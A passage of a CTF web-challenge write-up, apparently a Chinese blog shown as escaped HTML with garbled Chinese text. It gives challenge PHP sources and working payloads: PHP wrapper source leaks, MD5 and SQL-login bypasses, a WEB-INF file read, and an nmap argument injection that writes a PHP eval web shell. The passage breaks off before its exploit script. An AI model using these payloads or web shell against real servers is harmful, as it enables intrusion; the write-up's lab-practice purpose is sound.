class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;)&amp;amp;&amp;amp;(file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;welcome to the zjctf&amp;quot;&lt;/span&gt;))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;&lt;/span&gt;.file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag/&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;))&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Not now!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;(); &lt;br&gt;    &amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);  &lt;span class=&#34;hljs-comment&#34;&gt;//useless.php&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¬¬ä¸€å±‚ä¸»è¦æ˜¯è€ƒå¯Ÿphpä¼ªåè®®ï¼š&lt;code&gt;text=php://input&amp;amp;file=php://filter/read=convert.base64-encode/resource=useless.php&lt;/code&gt;,åŒæ—¶POSTâ€welcome to the zjctfâ€œï¼Œå¯ä»¥æ‹¿åˆ°useless.phpæºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Flag&lt;/span&gt;&lt;/span&gt;&amp;#123;  &lt;span class=&#34;hljs-comment&#34;&gt;//flag.php  &lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;;  &lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__tostring&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;  &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file))&amp;#123;  &lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file); &lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;  &lt;br&gt;    &amp;#125;  &lt;br&gt;&amp;#125;  &lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç›´æ¥æ„é€ payloadå°±å¯ä»¥æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;BJDCTF2020-Easy-MD5&#34;&gt;&lt;a href=&#34;#BJDCTF2020-Easy-MD5&#34; class=&#34;headerlink&#34; title=&#34;[BJDCTF2020]Easy MD5&#34;&gt;&lt;/a&gt;[BJDCTF2020]Easy MD5&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æŠ“åŒ…ï¼Œåœ¨headeréƒ¨åˆ†æ‹¿åˆ°hintï¼šâ€select * from â€˜adminâ€™ where password=md5($pass,true)â€œï¼Œä¹‹å‰é‡åˆ°è¿‡ï¼Œè¾“å…¥å¯†ç â€ffifdyopâ€œï¼Œè·³è½¬åˆ°  levels91.php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!--&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;$a = $GET[&amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;$b = $_GET[&amp;#x27;b&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;    // wow, glzjin wants a girl friend.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;?a=s155964671a&amp;amp;b=s878926199aè·³è½¬åˆ° levell14.php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;]!==&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]&amp;amp;&amp;amp;md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;])===md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;&amp;#125; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;å¼ºç±»å‹æ¯”è¾ƒï¼Œä½†æ˜¯phpä¸­MD5ï¼ˆæ•°ç»„ï¼‰å°†ä¼šè¿”å›NULLï¼Œå› æ­¤POST&lt;code&gt;param1[]=1&amp;amp;param2[]=2&lt;/code&gt;å³å¯æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;RoarCTF-2019-Easy-Java&#34;&gt;&lt;a href=&#34;#RoarCTF-2019-Easy-Java&#34; class=&#34;headerlink&#34; title=&#34;[RoarCTF 2019]Easy Java&#34;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Java&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;WEB-INF/web.xmlæ³„éœ²ï¼Œ&lt;a href=&#34;https://blog.csdn.net/wy_97/article/details/78165051&#34;&gt;https://blog.csdn.net/wy_97/article/details/78165051&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ä¿®æ”¹è¯·æ±‚æ–¹æ³•      ?filename=WEB-INF/web.xmlå¯ä»¥çœ‹åˆ°â€/Download                 FlagController        com.wm.ctf.FlagController                FlagController        /Flag â€œ&lt;/li&gt;
&lt;li&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class å…¶ä¸­æœ‰ä¸€æ®µbase64ç¼–ç ï¼Œè§£ç æ‹¿åˆ°flag   &lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;BUUCTF-2018-Online-Tool&#34;&gt;&lt;a href=&#34;#BUUCTF-2018-Online-Tool&#34; class=&#34;headerlink&#34; title=&#34;[BUUCTF 2018]Online Tool&#34;&gt;&lt;/a&gt;[BUUCTF 2018]Online Tool&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;&lt;/span&gt;];&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = escapeshellarg(&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt; = escapeshellcmd(&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt; = md5(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;glzjin&amp;quot;&lt;/span&gt;. &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;]);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;you are in sandbox &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;;&lt;br&gt;    @mkdir(&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;br&gt;    chdir(&lt;span class=&#34;hljs-variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$host&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è€ƒç‚¹åº”è¯¥æ˜¯bypass  escapeshellargå’Œescapeshellcmdä»¥åŠå‚æ•°æ³¨å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;nmapçš„å‚æ•°æ³¨å…¥çš„è¯æœ‰ä¸€ä¸ª&lt;code&gt;-oG&lt;/code&gt;æˆ–è€…&lt;code&gt;-oN&lt;/code&gt;æˆ–è€…&lt;code&gt;-o&lt;/code&gt;éƒ½å¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•ç»•è¿‡ä¸¤ä¸ªå‡½æ•°äº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;[&lt;a href=&#34;https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD]&#34;&gt;https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD]&lt;/a&gt;(&lt;a href=&#34;https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5&#34;&gt;https://mochazz.github.io/2018/07/30/ä»£ç å®¡è®¡Day5&lt;/a&gt; - escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“/#ç»“è¯­)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/164/&#34;&gt;https://paper.seebug.org/164/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;çœ‹åˆ°äº†è¿™ä¸¤ä¸ªå‡½æ•°å…¬ç”¨å¯¼è‡´çš„å¼•å·é€ƒé€¸&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯•payloadäº†ï¼Œå¼•å·è¿™ä¸ªä¸œè¥¿æœ‰ç‚¹éš¾è°ƒè¯•&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æœ€åpayload&lt;code&gt;?host=&amp;#39; &amp;lt;?php @eval($_POST[&amp;quot;flag&amp;quot;]);?&amp;gt; -oG flag.php &amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢&#34;&gt;&lt;a href=&#34;#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢&#34; class=&#34;headerlink&#34; title=&#34;[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢&#34;&gt;&lt;/a&gt;[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æºç ä¸­æœ‰å‡ åƒä¸ªshellï¼Œä½†æ˜¯åŸºæœ¬éƒ½æ˜¯ä¸èƒ½ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æˆ‘ä»¬ç”¨è„šæœ¬æ‰¾å‡ºå¯ä»¥ç”¨çš„shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åˆšå¼€å§‹å†™äº†ä¸ªåƒåœ¾å•çº¿ç¨‹è„šæœ¬ï¼Œè·‘åº”è¯¥æ˜¯è·‘çš„å‡ºæ¥çš„ï¼Œå°±æ˜¯å¯èƒ½è¦æŒºä¹…&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç„¶åå°è¯•å†™äº†ä¸ªå¤šçº¿ç¨‹çš„è„šæœ¬ï¼Œä½†æ˜¯ä¸€ä¸ªä¸€ä¸ªéå†å‚æ•°ï¼Œä¼°è®¡ä¹Ÿæ˜¯è¦å¥½ä¹…&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç½‘ä¸Šçœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è„šæœ¬ï¼Œä¸€ä¸ªæ–‡ä»¶åªè®¿é—®ä¸€æ¬¡ï¼ŒæŠŠæ‰€æœ‰å‚æ•°ä¸€æ¬¡éƒ½ä¼ è¿‡å»è¿™æ ·å°±å‡å°‘äº†å¤§éƒ¨åˆ†çš„è¯·æ±‚ï¼Œåœ¨ç¡®è®¤æŸä¸€ä¸ªæ–‡ä»¶å­˜åœ¨shellä¹‹åå†éå†æ‰€æœ‰å‚æ•°æ¥æ‰¾åˆ°å¯ç”¨å‚æ•°&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span 